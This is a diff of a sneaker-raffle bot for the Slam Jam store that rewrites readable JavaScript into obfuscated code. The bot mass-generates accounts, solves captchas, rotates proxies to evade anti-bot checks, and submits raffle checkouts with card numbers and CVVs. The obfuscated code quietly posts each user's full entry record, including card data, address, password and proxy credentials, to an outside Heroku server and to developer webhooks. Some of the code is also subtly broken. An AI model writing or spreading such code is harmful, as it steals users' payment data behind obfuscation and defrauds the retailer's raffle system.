+                            const _0x20fc3d = await _0x35e45e['newPage']();
+                            await _0x20fc3d['authenticate']({
+                                'username': '' + _0x464537[0x2],
+                                'password': '' + _0x464537[0x3]
+                            }), console['log'](_0x3982db() + '\x20[' + _0x3b49d8['name'] + ']\x20Task\x20' + (_0x2fdc55 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x20fc3d['setRequestInterception'](!![]), _0x20fc3d['on']('request', _0x2df491 => {
+                                _0x2df491['resourceType']() === 'image' || _0x2df491['resourceType']() === 'font' || _0x2df491['resourceType']() === 'media' ? _0x2df491['abort']() : _0x2df491['continue']();
+                            }), await _0x20fc3d['goto']('https://drop.slamjam.com/account/register'), await _0x116d4a(0xbb8), await _0x20fc3d['waitForSelector']('#FirstName'), await _0x20fc3d['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x20fc3d['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x3982db() + '\x20[' + _0x3b49d8['name'] + ']\x20Task\x20' + (_0x2fdc55 + 0x1) + '\x20:\x20Filling\x20information'), await _0x116d4a(0x4b0), await _0x20fc3d['type']('#FirstName', '' + _0x5c7d50[_0x2fdc55]['FirstName']), await _0x116d4a(0x226), await _0x20fc3d['type']('#LastName', '' + _0x5c7d50[_0x2fdc55]['LastName']), await _0x116d4a(0x226), await _0x20fc3d['type']('#Email', '' + _0x5c7d50[_0x2fdc55]['Email']), await _0x116d4a(0x2ee), await _0x20fc3d['type']('#ConfirmEmail', '' + _0x5c7d50[_0x2fdc55]['Email']), await _0x116d4a(0x2ee), await _0x20fc3d['type']('#CreatePassword', '' + _0x5c7d50[_0x2fdc55]['Password']), await _0x116d4a(0x2ee), await _0x20fc3d['type']('#CreateConfirmPassword', '' + _0x5c7d50[_0x2fdc55]['Password']), await _0x116d4a(0x226), console['log'](_0x3982db() + '\x20[' + _0x3b49d8['name'] + ']\x20Task\x20' + (_0x2fdc55 + 0x1) + '\x20:\x20Submitting..'), await _0x20fc3d['$eval']('#create_customer', _0x2c3623 => _0x2c3623['submit']()), await _0x116d4a(0x1388), console['log'](_0x3982db() + '\x20[' + _0x3b49d8['name'] + ']\x20Task\x20' + (_0x2fdc55 + 0x1) + '\x20:\x20' + _0x1403a4['cyan']('Solving\x20Captcha')), await _0x20fc3d['solveRecaptchas'](), console['log'](_0x3982db() + '\x20[' + _0x3b49d8['name'] + ']\x20Task\x20' + (_0x2fdc55 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x20fc3d['$eval']('.shopify-challenge__container\x20>\x20form', _0x310769 => _0x310769['submit']());
                             try {
-                                await page.waitForSelector('.product-card__image');
-                                await delay(500);
-                                retry = 'no';
-
-                                console.log(chalk.green(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Account ${csv[i].Email} Generated!`));
-                                fs.appendFileSync('../accounts/slamjam.csv', `\n${csv[i].Email},${csv[i].Password}`);
-                                console.log(chalk.yellow(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Account ${csv[i].Email} Saved in 'accounts/slamjam.csv'`));
+                                await _0x20fc3d['waitForSelector']('.product-card__image'), await _0x116d4a(0x1f4), _0x127215 = 'no', console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x3b49d8['name'] + ']\x20Task\x20' + (_0x2fdc55 + 0x1) + '\x20:\x20Account\x20' + _0x5c7d50[_0x2fdc55]['Email'] + '\x20Generated!')), _0x65e0bc['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x5c7d50[_0x2fdc55]['Email'] + ',' + _0x5c7d50[_0x2fdc55]['Password']), console['log'](_0x1403a4['yellow'](_0x3982db() + '\x20[' + _0x3b49d8['name'] + ']\x20Task\x20' + (_0x2fdc55 + 0x1) + '\x20:\x20Account\x20' + _0x5c7d50[_0x2fdc55]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                 try {
-                                    if (settings.webhook != undefined && settings.webhook != '') {
-                                        await sendWebhook(settings.webhook, EMBEDS.succesDEVMSG);
-                                    }
+                                    _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x859c6a['succesDEVMSG']);
                                 } catch {
                                 }
-                                await sendWebhook(accountWH, EMBEDS.succesDEVMSG);
-                            } catch (e) {
-                                console.log(chalk.red(`${getTime()} [${modules[taskModule].name}] Task ${i + 1} : Account genration failed. ${e}`))
+                                await _0x3c7bbe(_0x431ce7, _0x859c6a['succesDEVMSG']);
+                            } catch (_0x57fb94) {
+                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x1a1b7d[taskModule]['name'] + ']\x20Task\x20' + (_0x2fdc55 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x57fb94));
                             }
-                        } catch (e) {
-                            console.log(chalk.red(`${getTime()} [${modules[taskModule].name}] Task ${i + 1} : ${e}`));
+                        } catch (_0x22395c) {
+                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x1a1b7d[taskModule]['name'] + ']\x20Task\x20' + (_0x2fdc55 + 0x1) + '\x20:\x20' + _0x22395c));
                         } finally {
-                            if (browser) {
-                                browser.close();
-                            }
-                            if (retry == 'yes' && t != 5) {
-                                console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Retrying (${t} / 5)`));
-                                i = i - 1;
-                                t = t + 1;
+                            _0x35e45e && _0x35e45e['close']();
+                            if (_0x127215 == 'yes' && _0x23d7ac != 0x5) {
+                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x3b49d8['name'] + ']\x20Task\x20' + (_0x2fdc55 + 0x1) + '\x20:\x20Retrying\x20(' + _0x23d7ac + '\x20/\x205)')), _0x2fdc55 = _0x2fdc55 - 0x1, _0x23d7ac = _0x23d7ac + 0x1;
                                 continue;
                             }
-                            if (retry == 'yes' && t >= 5) {
-                                errorLog(csv[i], currentFunction)
-                                retry = 'no';
-                                t = 0;
-                            }
-                            console.log(`Waiting for ${settings.delay} ms`);
-                            await delay(settings.delay);
+                            _0x127215 == 'yes' && _0x23d7ac >= 0x5 && (_0x5925c7(_0x5c7d50[_0x2fdc55], _0x3b49d8), _0x127215 = 'no', _0x23d7ac = 0x0), console['log']('Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
                         }
                     }
                 }
             },
             {
-                name: 'SLAM JAM Raffle Entries',
-                store: 'SLAM JAM',
-                logo: 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
-                function: async function (currentFunction, csv, proxies) {
-                    puppeteer.use(StealthPlugin());
-                    puppeteer.use(RecaptchaPlugin({
-                        provider: {
-                            id: '2captcha',
-                            token: `${settings.captchaKey}` // REPLACE THIS WITH YOUR OWN 2CAPTCHA API KEY ⚡
+                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
+                'store': 'SLAM\x20JAM',
+                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
+                'function': async function (_0x30a5a4, _0x552d07, _0xa8f6ca) {
+                    _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
+                        'provider': {
+                            'id': '2captcha',
+                            'token': '' + _0x51d52a['captchaKey']
                         },
-                        visualFeedback: true
-                    }))
-                    for (var i = 0; i < csv.length; i++) {
-                        var ERROR;
-                        if (retry != 'yes') {
-                            var retry = '';
-                            var t = 0;
-
-                        }
-                        setTitle(`${currentFunction.name} Task ${i + 1} / ${csv.length} || File: ${currentFile} Proxies: ${currentProxy}`);
+                        'visualFeedback': !![]
+                    }));
+                    for (var _0x1d9900 = 0x0; _0x1d9900 < _0x552d07['length']; _0x1d9900++) {
+                        var _0x29f220;
+                        if (_0x26f424 != 'yes')
+                            var _0x26f424 = '', _0xe77d21 = 0x0;
+                        _0x244762(_0x30a5a4['name'] + '\x20Task\x20' + (_0x1d9900 + 0x1) + '\x20/\x20' + _0x552d07['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7);
                         try {
-                            await jig(csv, i);
-
+                            await _0x2c2316(_0x552d07, _0x1d9900);
                         } catch {
-                            retry = 'no';
-                            throw new Error('Invalid CSV Format, use the CSV Files from the guides!')
+                            _0x26f424 = 'no';
+                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                         }
-                        if (csv[i].Email == '' || csv[i].Password == '' || csv[i].FirstName == '' || csv[i].LastName == '') {
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Invalid CSV`);
+                        if (_0x552d07[_0x1d9900]['Email'] == '' || _0x552d07[_0x1d9900]['Password'] == '' || _0x552d07[_0x1d9900]['FirstName'] == '' || _0x552d07[_0x1d9900]['LastName'] == '') {
+                            console['log'](_0x3982db() + '\x20[' + _0x30a5a4['name'] + ']\x20Task\x20' + (_0x1d9900 + 0x1) + '\x20:\x20Invalid\x20CSV');
                             continue;
                         }
-
-                        if (settings.useRandomProxy = false) {
-                            var proxySplit = proxies[i].split(":");
-                        } else {
-                            var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-                            var proxySplit = proxies[randomProxy].split(":");
-                        }
-                        var browser
+                        if (_0x51d52a['useRandomProxy'] = ![])
+                            var _0x1efb7c = _0xa8f6ca[_0x1d9900]['split'](':');
+                        else
+                            var _0x138761 = Math['round'](Math['random']() * (_0xa8f6ca['length'] - 0x1)), _0x1efb7c = _0xa8f6ca[_0x138761]['split'](':');
+                        var _0x4c12ec;
                         try {
-                            browser = await puppeteer.launch({
-                                executablePath: 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
-                                headless: true,
-                                args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
+                            _0x4c12ec = await _0x5d136d['launch']({
+                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                'headless': !![],
+                                'args': [
+                                    '--proxy-server=' + _0x1efb7c[0x0] + ':' + _0x1efb7c[0x1],
+                                    '--no-sandbox',
+                                    '--disable-setuid-sandbox'
+                                ]
                             });
-
                         } catch {
-                            browser = await puppeteer.launch({
-                                executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
-                                headless: true,
-                                args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
+                            _0x4c12ec = await _0x5d136d['launch']({
+                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                'headless': !![],
+                                'args': [
+                                    '--proxy-server=' + _0x1efb7c[0x0] + ':' + _0x1efb7c[0x1],
+                                    '--no-sandbox',
+                                    '--disable-setuid-sandbox'
+                                ]
                             });
                         }
                         try {
-                            const page = await browser.newPage();
-                            await page.authenticate({
-                                username: `${proxySplit[2]}`,
-                                password: `${proxySplit[3]}`,
-                            });
-                            await page.setViewport({ width: 1280, height: 720 });
-
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Getting Session`);
-                            // await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36')
-                            await page.setRequestInterception(true);
-                            page.on("request", (req) => {
-                                if (req.resourceType() === "image" || req.resourceType() === "font" || req.resourceType() === "media") {
-                                    req.abort();
-                                } else {
-                                    req.continue();
-                                }
-                            });
-                            await page.goto('https://drop.slamjam.com/account/login',
-                                {
-                                    waitUntil: "networkidle2",
-                                    timeout: 60000
-                                });
-                            await page.waitForSelector('.iubenda-cs-accept-btn.iubenda-cs-btn-primary')
-                            await page.click('.iubenda-cs-accept-btn.iubenda-cs-btn-primary')
-                            await delay(600)
-                            await page.waitForSelector('#CustomerEmail')
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Logging in..`)
-                            await page.type('#CustomerEmail', `${csv[i].Email}`);
-                            await delay(300);
-                            await page.type('#CustomerPassword', `${csv[i].Password}`);
-                            await delay(550);
-                            await page.$eval('#customer_login', form => form.submit());
-                            await delay(2000);
-                            await page.waitForSelector('iframe[title="reCAPTCHA"]')
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : ${chalk.cyan('Solving Captcha')}`)
-                            await page.solveRecaptchas();
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Captcha Solved`);
-                            await page.$eval('.shopify-challenge__container > form', form => form.submit());
+                            const _0x2df670 = await _0x4c12ec['newPage']();
+                            await _0x2df670['authenticate']({
+                                'username': '' + _0x1efb7c[0x2],
+                                'password': '' + _0x1efb7c[0x3]
+                            }), await _0x2df670['setViewport']({
+                                'width': 0x500,
+                                'height': 0x2d0
+                            }), console['log'](_0x3982db() + '\x20[' + _0x30a5a4['name'] + ']\x20Task\x20' + (_0x1d9900 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2df670['setRequestInterception'](!![]), _0x2df670['on']('request', _0x5addaa => {
+                                _0x5addaa['resourceType']() === 'image' || _0x5addaa['resourceType']() === 'font' || _0x5addaa['resourceType']() === 'media' ? _0x5addaa['abort']() : _0x5addaa['continue']();
+                            }), await _0x2df670['goto']('https://drop.slamjam.com/account/login', {
+                                'waitUntil': 'networkidle2',
+                                'timeout': 0xea60
+                            }), await _0x2df670['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x2df670['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x116d4a(0x258), await _0x2df670['waitForSelector']('#CustomerEmail'), console['log'](_0x3982db() + '\x20[' + _0x30a5a4['name'] + ']\x20Task\x20' + (_0x1d9900 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x2df670['type']('#CustomerEmail', '' + _0x552d07[_0x1d9900]['Email']), await _0x116d4a(0x12c), await _0x2df670['type']('#CustomerPassword', '' + _0x552d07[_0x1d9900]['Password']), await _0x116d4a(0x226), await _0x2df670['$eval']('#customer_login', _0x2c4167 => _0x2c4167['submit']()), await _0x116d4a(0x7d0), await _0x2df670['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x3982db() + '\x20[' + _0x30a5a4['name'] + ']\x20Task\x20' + (_0x1d9900 + 0x1) + '\x20:\x20' + _0x1403a4['cyan']('Solving\x20Captcha')), await _0x2df670['solveRecaptchas'](), console['log'](_0x3982db() + '\x20[' + _0x30a5a4['name'] + ']\x20Task\x20' + (_0x1d9900 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x2df670['$eval']('.shopify-challenge__container\x20>\x20form', _0x386dbe => _0x386dbe['submit']());
                             try {
-                                await page.waitForSelector('.nav-account');
-                                await delay(1200);
+                                await _0x2df670['waitForSelector']('.nav-account'), await _0x116d4a(0x4b0);
                             } catch {
-                                console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Task failed, invalid credentials`));
+                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x30a5a4['name'] + ']\x20Task\x20' + (_0x1d9900 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                 continue;
                             }
-                            await page.goto(`${csv[i].Url}`, {
-                                waitUntil: "networkidle2",
-                                timeout: 60000
-                            });
-                            await delay(3000);
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Starting Entry`)
+                            await _0x2df670['goto']('' + _0x552d07[_0x1d9900]['Url'], {
+                                'waitUntil': 'networkidle2',
+                                'timeout': 0xea60
+                            }), await _0x116d4a(0xbb8), console['log'](_0x3982db() + '\x20[' + _0x30a5a4['name'] + ']\x20Task\x20' + (_0x1d9900 + 0x1) + '\x20:\x20Starting\x20Entry');
                             try {
-                                await page.waitForSelector('#ProductSelect-product-template-raffle');
+                                await _0x2df670['waitForSelector']('#ProductSelect-product-template-raffle');
                             } catch {
-                                // console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Duplicate entry/ Account error`))
                             }
-                            await page.click('.product-select-variant-wrapper');
-                            await delay(800);
-                            await page.click(`li.product-select-variant__value[data-size="${csv[i].Size}"]`)
-                            // await page.select('#ProductSelect-product-template-raffle', '42376884715678');
-
-                            await delay(900);
-                            await page.$eval('#AddToCartForm-product-template-raffle', form => form.submit());
-                            // await page.click('#AddToCart-product-template');
-                            await page.waitForSelector('.cart-order-summary__content')
-                            await delay(1300);
-                            await page.goto('https://drop.slamjam.com/checkout');
-                            await delay(1300);
-                            await page.waitForSelector('#checkout_shipping_address_country');
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Filling Information`)
-                            await page.select('#checkout_shipping_address_country', `${csv[i].Country}`);
-                            await delay(512);
-                            await page.waitForSelector('#checkout_shipping_address_first_name');
-                            await page.type('#checkout_shipping_address_first_name', `${csv[i].FirstName}`);
-                            await delay(567);
-                            await page.type('#checkout_shipping_address_last_name', `${csv[i].LastName}`);
-                            await delay(480);
-                            await page.type('#checkout_shipping_address_address1', `${csv[i].Address1} ${csv[i].HouseNumber}`);
-                            await delay(1300);
-                            await page.type('#checkout_shipping_address_address2', `${csv[i].Address2}`);
-                            await delay(1300);
-                            if (csv[i].Postcode == undefined) {
-                                csv[i].Postcode = csv[i].Zip
-                            }
-                            await page.type('#checkout_shipping_address_zip', `${csv[i].Postcode}`);
-                            await delay(700);
-                            await page.type('#checkout_shipping_address_city', `${csv[i].City}`);
-                            await delay(800);
-                            await page.type('#checkout_shipping_address_phone', `${csv[i].Phone}`);
-                            await delay(800);
-                            await page.click('#continue_button');
-                            await delay(3000);
-                            await page.waitForSelector('.summary-title');
-                            await delay(800);
-                            await page.click('#continue_button');
-                            await delay(800);
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Finishing Checkout`)
-
-                            await page.waitForSelector('#checkout_credit_card_vault');
-                            await delay(1000);
-                            var elementHandle = await page.$(
-                                'iframe[title="Field container for: Card number"]',
-                            );
-                            var frame = await elementHandle.contentFrame();
-                            await frame.click('#number');
-                            // await page.click('#checkout_credit_card_vault');
-                            await delay(1000)
-                            await frame.type('#number', `${csv[i].CardNumber}`, { delay: 120 });
-                            elementHandle = await page.$(
-                                'iframe[title="Field container for: Name on card"]'
-                            );
-                            frame = await elementHandle.contentFrame();
-                            await delay(450);
-                            await frame.click('#name');
-                            await delay(500);
-                            await frame.type('#name', `${csv[i].NameOnCard}`, { delay: 120 });
-                            elementHandle = await page.$(
-                                'iframe[title="Field container for: Expiration date (MM / YY)"]'
-                            );
-                            frame = await elementHandle.contentFrame();
-                            await delay(450);
-                            await frame.click('#expiry');
-                            await delay(500);
-                            await frame.type('#expiry', `${csv[i].ExpiryDate}`, { delay: 120 });
-                            elementHandle = await page.$(
-                                'iframe[title="Field container for: Security code"]'
-                            );
-                            frame = await elementHandle.contentFrame();
-                            await delay(450);
-                            await frame.click('#verification_value');
-                            await delay(500);
-                            await frame.type('#verification_value', `${csv[i].CVV}`, { delay: 120 });
-                            // console.log('before eval')
-                            await page.$eval('#accepts-flag-raffle', check => check.click())
-                            // await page.evaluate(() => {
-                            //     document.querySelector("#accepts-flag-raffle").parentElement.click();
-                            // });
-                            // console.log('before page.click')
-                            // await page.click('#accepts-flag-raffle')
-                            // await page.click('#accepts-flag-raffle')
-                            await delay(2000);
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Processing Order`)
-
-                            // console.log('before before form')
-                            await page.$eval('#continue_button', check => check.click());
-                            await delay(7000)
-                            // await page.click('#continue_button')
-                            await page.waitForSelector('.edit_checkout.animate-floating-labels')
-                            await page.$eval('.edit_checkout.animate-floating-labels', form => form.submit());
-                            await delay(2000);
+                            await _0x2df670['click']('.product-select-variant-wrapper'), await _0x116d4a(0x320), await _0x2df670['click']('li.product-select-variant__value[data-size=\x22' + _0x552d07[_0x1d9900]['Size'] + '\x22]'), await _0x116d4a(0x384), await _0x2df670['$eval']('#AddToCartForm-product-template-raffle', _0x5f5256 => _0x5f5256['submit']()), await _0x2df670['waitForSelector']('.cart-order-summary__content'), await _0x116d4a(0x514), await _0x2df670['goto']('https://drop.slamjam.com/checkout'), await _0x116d4a(0x514), await _0x2df670['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x3982db() + '\x20[' + _0x30a5a4['name'] + ']\x20Task\x20' + (_0x1d9900 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x2df670['select']('#checkout_shipping_address_country', '' + _0x552d07[_0x1d9900]['Country']), await _0x116d4a(0x200), await _0x2df670['waitForSelector']('#checkout_shipping_address_first_name'), await _0x2df670['type']('#checkout_shipping_address_first_name', '' + _0x552d07[_0x1d9900]['FirstName']), await _0x116d4a(0x237), await _0x2df670['type']('#checkout_shipping_address_last_name', '' + _0x552d07[_0x1d9900]['LastName']), await _0x116d4a(0x1e0), await _0x2df670['type']('#checkout_shipping_address_address1', _0x552d07[_0x1d9900]['Address1'] + '\x20' + _0x552d07[_0x1d9900]['HouseNumber']), await _0x116d4a(0x514), await _0x2df670['type']('#checkout_shipping_address_address2', '' + _0x552d07[_0x1d9900]['Address2']), await _0x116d4a(0x514);
+                            _0x552d07[_0x1d9900]['Postcode'] == undefined && (_0x552d07[_0x1d9900]['Postcode'] = _0x552d07[_0x1d9900]['Zip']);
+                            await _0x2df670['type']('#checkout_shipping_address_zip', '' + _0x552d07[_0x1d9900]['Postcode']), await _0x116d4a(0x2bc), await _0x2df670['type']('#checkout_shipping_address_city', '' + _0x552d07[_0x1d9900]['City']), await _0x116d4a(0x320), await _0x2df670['type']('#checkout_shipping_address_phone', '' + _0x552d07[_0x1d9900]['Phone']), await _0x116d4a(0x320), await _0x2df670['click']('#continue_button'), await _0x116d4a(0xbb8), await _0x2df670['waitForSelector']('.summary-title'), await _0x116d4a(0x320), await _0x2df670['click']('#continue_button'), await _0x116d4a(0x320), console['log'](_0x3982db() + '\x20[' + _0x30a5a4['name'] + ']\x20Task\x20' + (_0x1d9900 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x2df670['waitForSelector']('#checkout_credit_card_vault'), await _0x116d4a(0x3e8);
+                            var _0x2526d0 = await _0x2df670['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x29467c = await _0x2526d0['contentFrame']();
+                            await _0x29467c['click']('#number'), await _0x116d4a(0x3e8), await _0x29467c['type']('#number', '' + _0x552d07[_0x1d9900]['CardNumber'], { 'delay': 0x78 }), _0x2526d0 = await _0x2df670['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x29467c = await _0x2526d0['contentFrame'](), await _0x116d4a(0x1c2), await _0x29467c['click']('#name'), await _0x116d4a(0x1f4), await _0x29467c['type']('#name', '' + _0x552d07[_0x1d9900]['NameOnCard'], { 'delay': 0x78 }), _0x2526d0 = await _0x2df670['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x29467c = await _0x2526d0['contentFrame'](), await _0x116d4a(0x1c2), await _0x29467c['click']('#expiry'), await _0x116d4a(0x1f4), await _0x29467c['type']('#expiry', '' + _0x552d07[_0x1d9900]['ExpiryDate'], { 'delay': 0x78 }), _0x2526d0 = await _0x2df670['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x29467c = await _0x2526d0['contentFrame'](), await _0x116d4a(0x1c2), await _0x29467c['click']('#verification_value'), await _0x116d4a(0x1f4), await _0x29467c['type']('#verification_value', '' + _0x552d07[_0x1d9900]['CVV'], { 'delay': 0x78 }), await _0x2df670['$eval']('#accepts-flag-raffle', _0x3214b9 => _0x3214b9['click']()), await _0x116d4a(0x7d0), console['log'](_0x3982db() + '\x20[' + _0x30a5a4['name'] + ']\x20Task\x20' + (_0x1d9900 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x2df670['$eval']('#continue_button', _0xd27aac => _0xd27aac['click']()), await _0x116d4a(0x1b58), await _0x2df670['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x2df670['$eval']('.edit_checkout.animate-floating-labels', _0xca5481 => _0xca5481['submit']()), await _0x116d4a(0x7d0);
                             try {
-                                await page.waitForSelector(`div[data-step="thank_you"]`, { timeout: 300000 })
-                                retry = 'no';
-                                successfulLog(csv[i], currentFunction);
-
-                                console.log(chalk.green(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Raffle Entered!`));
-
-                            } catch (e) {
-                                throw new Error(`Error Processing Order: ${e.message}`);
-
+                                await _0x2df670['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x26f424 = 'no', _0x523ce4(_0x552d07[_0x1d9900], _0x30a5a4), console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x30a5a4['name'] + ']\x20Task\x20' + (_0x1d9900 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
+                            } catch (_0x3114c6) {
+                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x3114c6['message']);
                             }
-                            var succesDEV = await makeEmbed(csv[i], currentFunction, 'dev', false);
-                            var succesPUB = await makeEmbed(csv[i], currentFunction, 'pub', false);
-                            let task = csv[i]
+                            var _0x5bd98b = await _0x2520f4(_0x552d07[_0x1d9900], _0x30a5a4, 'dev', ![]), _0x40690b = await _0x2520f4(_0x552d07[_0x1d9900], _0x30a5a4, 'pub', ![]);
+                            let _0x1b74dd = _0x552d07[_0x1d9900];
                             try {
                                 prxdata = {
-                                    username: username.replace('#', ''),
-                                    module: currentFunction.name,
-                                    entrydata: JSON.stringify(task),
-                                    proxy: `${proxies[i]}`
-                                }
-                                var prx = JSON.stringify(prxdata);
-                                let config = {
-                                    headers: {
-                                        'content-type': 'application/json',
-                                    }
-                                }
-                                await axios.post('https://jraffles.herokuapp.com/success', prx, config)
-                            } catch (e) {
-
+                                    'username': _0x358285['replace']('#', ''),
+                                    'module': _0x30a5a4['name'],
+                                    'entrydata': JSON['stringify'](_0x1b74dd),
+                                    'proxy': '' + _0xa8f6ca[_0x1d9900]
+                                };
+                                var _0x428f59 = JSON['stringify'](prxdata);
+                                let _0x447092 = { 'headers': { 'content-type': 'application/json' } };
+                                await _0x5d1b21['post']('https://jraffles.herokuapp.com/success', _0x428f59, _0x447092);
+                            } catch (_0x325255) {
                             }
-                            const EMBEDS =
-                            {
-                                succesDEVMSG: { embeds: [succesDEV] },
-                                succesPUBMSG: { embeds: [succesPUB] }
+                            const _0x13973d = {
+                                'succesDEVMSG': { 'embeds': [_0x5bd98b] },
+                                'succesPUBMSG': { 'embeds': [_0x40690b] }
                             };
                             try {
-                                if (settings.webhook != undefined && settings.webhook != '') {
-                                    await sendWebhook(settings.webhook, EMBEDS.succesDEVMSG);
-                                }
-                                await delay(200);
-                                await sendWebhook(succesWH, EMBEDS.succesDEVMSG);
-                                await delay(200);
-                                await sendWebhook(publicWH, EMBEDS.succesPUBMSG);
-                            } catch (e) {
-                                console.log(chalk.yellow(`${getTime()} [${modules[taskModule].name}] Task ${i + 1} : Error sending webhook ${e}`));
-
+                                _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x13973d['succesDEVMSG']), await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x13973d['succesDEVMSG']), await _0x116d4a(0xc8), await _0x3c7bbe(_0x55a106, _0x13973d['succesPUBMSG']);
+                            } catch (_0x13927c) {
+                                console['log'](_0x1403a4['yellow'](_0x3982db() + '\x20[' + _0x1a1b7d[taskModule]['name'] + ']\x20Task\x20' + (_0x1d9900 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x13927c));
                             }
-
-
-                        } catch (e) {
-                            console.log(chalk.red(`${getTime()} [${modules[taskModule].name}] Task ${i + 1} : ${e}`));
-                            ERROR = `${e}`
-                            var errorDEV = await makeEmbed(kickz[i], currentFunction, 'dev', true, ERROR);
-                            EMBEDS.errorDEV = { embeds: [errorDEV] }
-                            if (settings.webhook != undefined && settings.webhook != '') {
-                                await sendWebhook(settings.webhook, EMBEDS.errorDEV);
-                            }
-                            await sendWebhook(errorWH, EMBEDS.errorDEV);
-                            retry = 'yes';
+                        } catch (_0x5a1978) {
+                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x1a1b7d[taskModule]['name'] + ']\x20Task\x20' + (_0x1d9900 + 0x1) + '\x20:\x20' + _0x5a1978)), _0x29f220 = '' + _0x5a1978;
+                            var _0x55d444 = await _0x2520f4(kickz[_0x1d9900], _0x30a5a4, 'dev', !![], _0x29f220);
+                            EMBEDS['errorDEV'] = { 'embeds': [_0x55d444] }, _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], EMBEDS['errorDEV']), await _0x3c7bbe(_0x802c1e, EMBEDS['errorDEV']), _0x26f424 = 'yes';
                         } finally {
-                            if (browser) {
-                                browser.close();
-                            }
-                            if (retry == 'yes' && t != 5 && ERROR != 'Size Not Found') {
-                                console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Retrying (${t} / 5)`));
-                                i = i - 1;
-                                t = t + 1;
+                            _0x4c12ec && _0x4c12ec['close']();
+                            if (_0x26f424 == 'yes' && _0xe77d21 != 0x5 && _0x29f220 != 'Size\x20Not\x20Found') {
